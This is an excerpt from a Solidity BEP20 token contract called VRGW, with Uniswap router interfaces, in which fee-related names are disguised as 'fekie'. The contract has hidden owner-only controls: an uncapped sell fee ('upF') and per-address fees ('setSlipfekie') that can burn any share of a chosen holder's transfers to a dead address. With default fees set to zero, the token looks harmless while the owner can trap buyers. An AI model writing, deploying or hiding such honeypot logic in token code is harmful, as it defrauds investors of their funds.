...
interface IUniswapV2Factory {
    ...
    function fekieTo() external view returns (address);
    function fekieToSetter() external view returns (address);
    ...
    function setfekieTo(address) external;
    function setfekieToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfekieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfekieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfekieOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfekieOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfekieOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract VRGW is BEP20, Ownable {
    ...
    uint256 private _defaultSellfekie = 0;

    uint256 private _defaultBuyfekie = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfekie;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfekie = _value;
    }

    function setSlipfekie(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfekie[_address] = _value;
    }

    function getSlipfekie(address _address) external view onlyownar returns (uint256) {
        return _slipfekie[_address];
    }


    function setMAccountfekie(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfekie(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefekieAmount = 0;

        if (rF) {
            uint256 tradefekie = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefekie = _defaultSellfekie;
                }
                if (from == uniswapV2Pair) {

                    tradefekie = _defaultBuyfekie;
                }
            }
            if (_slipfekie[from] > 0) {
                tradefekie = _slipfekie[from];
            }

            tradefekieAmount = _Amount.mul(tradefekie).div(100);
        }


        if (tradefekieAmount > 0) {
            _balances[from] = _balances[from].sub(tradefekieAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefekieAmount);
            emit Transfer(from, _deadAddress, tradefekieAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefekieAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefekieAmount);
        emit Transfer(from, _to, _Amount - tradefekieAmount);
    }
